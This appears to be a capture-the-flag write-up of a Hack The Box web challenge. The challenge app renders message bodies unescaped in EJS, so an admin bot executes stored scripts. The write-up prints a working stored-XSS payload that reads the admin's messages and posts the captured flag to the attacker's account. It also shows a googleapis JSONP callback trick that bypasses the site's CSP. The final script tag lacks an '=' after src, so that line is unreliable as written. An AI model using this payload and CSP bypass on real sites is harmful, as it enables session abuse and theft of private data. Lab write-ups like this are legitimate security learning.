---
type: writeup
date: 2026-07-28
source: ctf
category: web exploitation
difficulty: easy
status: complete
tags:
  - web
---

## Target

- Scenario files: Express + EJS backend, SQLite, Playwright-driven admin bot that logs in and visits whatever message triggers it.
- Target: http://154.57.164.69:31743

## Recon

- `message.ejs` renders message content with `<%- message.content %>` (unescaped), while sender/date use `<%= %>` (escaped).
- CSP: `script-src 'self' https://www.googleapis.com` — plain script payloads are blocked and only googleapis is a trusted script origin.

## Vulnerability

- **Stored XSS.** Any HTML/JS in a message body executes when viewed, because the body is rendered unescaped. The admin bot visits messages, so a payload stored in a message runs in the admin's session.

## Exploitation

1. **Single-line exploit payload:**

```bash
(async function() { const response = await fetch('/messages/1'); const html = await response.text(); const flagMatch = html.match(/HTB\{[^}]+\}/); const flag = flagMatch[0]; await fetch('/messages', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'to_username=<ATTACKER_USER>&content=' + encodeURIComponent(flag) }); })();
```

The above payload does 3 things at once:
- fetch the first message from the seed script (`entrypoint.js`), where the flag gets sent from the archivist to the admin.
- grab only the flag `HTB{…}`
- post it back to us (I created a `test` user using the register option)

2. **URL encoded payload to handle special characters:**

```bash
encodeURIComponent(<insert the payload from above>)    # in dev console
```

3. **Send the script as message.content to the admin (recipient):**

```bash
<script src "https://www.googleapis.com/customsearch/v1?callback=ENCODED_PAYLOAD"></script>
```

A few seconds later you get a message back from the admin bot with the flag.

flag = HTB{…}

## Lessons Learned

**Delays**

- took time to find the unescaped render and get the CSP-compliant delivery working.

**New tricks**

- Never render user content with unescaped template tags.
- When debugging exploit payloads, isolate variables: test the gadget alone, test the js logic, use the dev console and your own terminal before firing at the real target.
- NEVER underestimate the "very easy" htb challenges... T_T
